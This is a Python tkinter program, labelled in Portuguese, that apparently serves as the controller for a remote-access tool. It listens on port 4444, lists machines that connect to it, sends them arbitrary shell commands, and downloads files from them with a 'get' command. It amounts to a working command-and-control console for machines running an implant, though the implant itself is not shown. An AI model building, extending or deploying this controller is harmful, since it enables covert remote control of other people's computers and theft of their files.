import os
import socket
import threading
import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox
from queue import Queue

class ServerGUI:
    def __init__(self, master):
        self.master = master
        self.master.title("Servidor de Controle")
        self.master.geometry("800x600")
        
        self.server_socket = None
        self.running = False
        self.connections = {}
        self.message_queue = Queue()
        
        self.create_widgets()
        self.setup_layout()
        self.update_ui()
    
    def create_widgets(self):
        # Frame de conexão
        self.connection_frame = ttk.LabelFrame(self.master, text="Configurações do Servidor")
        self.host_label = ttk.Label(self.connection_frame, text="Host:")
        self.host_entry = ttk.Entry(self.connection_frame, width=15)
        self.host_entry.insert(0, "0.0.0.0")
        self.port_label = ttk.Label(self.connection_frame, text="Porta:")
        self.port_entry = ttk.Entry(self.connection_frame, width=10)
        self.port_entry.insert(0, "4444")
        self.start_btn = ttk.Button(self.connection_frame, text="Iniciar", command=self.toggle_server)
        self.stop_btn = ttk.Button(self.connection_frame, text="Parar", state=tk.DISABLED, command=self.toggle_server)
        
        # Lista de clientes
        self.clients_frame = ttk.LabelFrame(self.master, text="Clientes Conectados")
        self.clients_list = tk.Listbox(self.clients_frame, height=10)
        self.clients_list.bind('<<ListboxSelect>>', self.select_client)
        
        # Área de logs
        self.log_frame = ttk.LabelFrame(self.master, text="Logs do Servidor")
        self.log_area = scrolledtext.ScrolledText(self.log_frame, state=tk.DISABLED)
        
        # Controle de comandos
        self.command_frame = ttk.LabelFrame(self.master, text="Enviar Comando")
        self.command_label = ttk.Label(self.command_frame, text="Comando:")
        self.command_entry = ttk.Entry(self.command_frame, width=50)
        self.send_btn = ttk.Button(self.command_frame, text="Enviar", command=self.send_command)
        self.selected_client = None
    
    def setup_layout(self):
        # Frame de conexão (mantido)
        self.connection_frame.pack(padx=10, pady=5, fill=tk.X)
        self.host_label.grid(row=0, column=0, padx=5, pady=2)
        self.host_entry.grid(row=0, column=1, padx=5, pady=2)
        self.port_label.grid(row=0, column=2, padx=5, pady=2)
        self.port_entry.grid(row=0, column=3, padx=5, pady=2)
        self.start_btn.grid(row=0, column=4, padx=5, pady=2)
        self.stop_btn.grid(row=0, column=5, padx=5, pady=2)

        # Lista de clientes + Comando (nova ordem)
        self.clients_frame.pack(padx=10, pady=5, fill=tk.BOTH, expand=True)
        self.clients_list.pack(padx=5, pady=5, fill=tk.BOTH, expand=True)
        
        # NOVA POSIÇÃO DO FRAME DE COMANDOS
        self.command_frame.pack(padx=10, pady=(0, 10), fill=tk.X)
        self.command_label.grid(row=0, column=0, padx=5, pady=5, sticky=tk.W)
        self.command_entry.grid(row=0, column=1, padx=5, pady=5, sticky=tk.EW)
        self.send_btn.grid(row=0, column=2, padx=5, pady=5)
        self.command_frame.columnconfigure(1, weight=1)

        # Área de logs (movida para baixo)
        self.log_frame.pack(padx=10, pady=5, fill=tk.BOTH, expand=True)
        self.log_area.pack(padx=5, pady=5, fill=tk.BOTH, expand=True)
    
    def log_message(self, message):
        self.log_area.configure(state=tk.NORMAL)
        self.log_area.insert(tk.END, message + "\n")
        self.log_area.configure(state=tk.DISABLED)
        self.log_area.see(tk.END)
    
    def update_ui(self):
        while not self.message_queue.empty():
            msg = self.message_queue.get()
            self.log_message(msg)
        
        current_clients = list(self.connections.keys())
        for client in current_clients:
            if f"{client[0]}:{client[1]}" not in self.clients_list.get(0, tk.END):
                self.clients_list.insert(tk.END, f"{client[0]}:{client[1]}")
        
        self.master.after(100, self.update_ui)
    
    def select_client(self, event):
        selection = self.clients_list.curselection()
        if selection:
            self.selected_client = self.clients_list.get(selection[0])
    
    def send_command(self):
        if not self.selected_client:
            messagebox.showwarning("Aviso", "Selecione um cliente primeiro!")
            return
        
        command = self.command_entry.get().strip()
        if not command:
            return
        
        addr = self.selected_client.split(":")
        client_addr = (addr[0], int(addr[1]))
        conn = self.connections.get(client_addr)
        
        if conn:
            try:
                conn.send(command.encode())
                self.log_message(f"[>>] Comando enviado para {self.selected_client}: {command}")
                self.command_entry.delete(0, tk.END)
                
                # Tratamento de respostas e comandos especiais
                if command.startswith("get "):
                    filename = command[4:].strip()
                    threading.Thread(target=self.receber_arquivo, args=(conn, filename)).start()
                elif command == "exit":
                    self.log_message(f"[-] Fechando sessão com {self.selected_client}")
                    conn.close()
                    del self.connections[client_addr]
                    self.clients_list.delete(0, tk.END)
                    for client in self.connections:
                        self.clients_list.insert(tk.END, f"{client[0]}:{client[1]}")
                else:
                    # Receber resposta assíncrona (já tratada no handle_client)
                    pass
            
            except Exception as e:
                self.log_message(f"[!] Erro ao enviar comando: {e}")
    
    def receber_arquivo(self, sock, nome_arquivo):
        try:
            with open(nome_arquivo, "wb") as f:
                self.log_message(f"[↓] Baixando '{nome_arquivo}'...")
                while True:
                    dados = sock.recv(4096)
                    if not dados:
                        break
                    if dados.endswith(b"<EOF>"):
                        f.write(dados[:-5])
                        break
                    f.write(dados)
            self.log_message(f"[✓] Arquivo '{nome_arquivo}' salvo com sucesso.")
        except Exception as e:
            self.log_message(f"[!] Erro ao receber arquivo: {e}")
    
    def handle_client(self, conn, addr):
        self.message_queue.put(f"[+] Nova conexão de {addr[0]}:{addr[1]}")
        self.connections[addr] = conn
        
        try:
            ip_local = conn.getsockname()[0]
            conn.send(f"SERVER_IP {ip_local}".encode())
            
            while self.running:
                response = conn.recv(4096)
                if not response:
                    break
                texto = response.decode(errors="ignore")
                self.message_queue.put(f"[{addr[0]}:{addr[1]}] {texto}")
        
        except Exception as e:
            self.message_queue.put(f"[!] Erro com {addr[0]}:{addr[1]}: {e}")
        finally:
            conn.close()
            del self.connections[addr]
            self.message_queue.put(f"[-] {addr[0]}:{addr[1]} desconectou")
            self.clients_list.delete(0, tk.END)
            for client in self.connections:
                self.clients_list.insert(tk.END, f"{client[0]}:{client[1]}")
    
    def start_server(self):
        host = self.host_entry.get()
        port = int(self.port_entry.get())
        
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.bind((host, port))
            self.server_socket.listen(10)
            self.running = True
            self.message_queue.put(f"[*] Servidor iniciado em {host}:{port}")
            
            threading.Thread(target=self.accept_connections, daemon=True).start()
            
            self.start_btn.config(state=tk.DISABLED)
            self.stop_btn.config(state=tk.NORMAL)
            self.host_entry.config(state=tk.DISABLED)
            self.port_entry.config(state=tk.DISABLED)
        
        except Exception as e:
            messagebox.showerror("Erro", f"Não foi possível iniciar o servidor:\n{str(e)}")
    
    def accept_connections(self):
        while self.running:
            try:
                conn, addr = self.server_socket.accept()
                client_thread = threading.Thread(
                    target=self.handle_client,
                    args=(conn, addr),
                    daemon=True
                )
                client_thread.start()
            except:
                pass
    
    def stop_server(self):
        self.running = False
        if self.server_socket:
            self.server_socket.close()
        for conn in self.connections.values():
            conn.close()
        self.connections.clear()
        self.message_queue.put("[!] Servidor parado")
        
        self.start_btn.config(state=tk.NORMAL)
        self.stop_btn.config(state=tk.DISABLED)
        self.host_entry.config(state=tk.NORMAL)
        self.port_entry.config(state=tk.NORMAL)
        self.clients_list.delete(0, tk.END)
    
    def toggle_server(self):
        if self.running:
            self.stop_server()
        else:
            self.start_server()

if __name__ == "__main__":
    root = tk.Tk()
    app = ServerGUI(root)
    root.mainloop()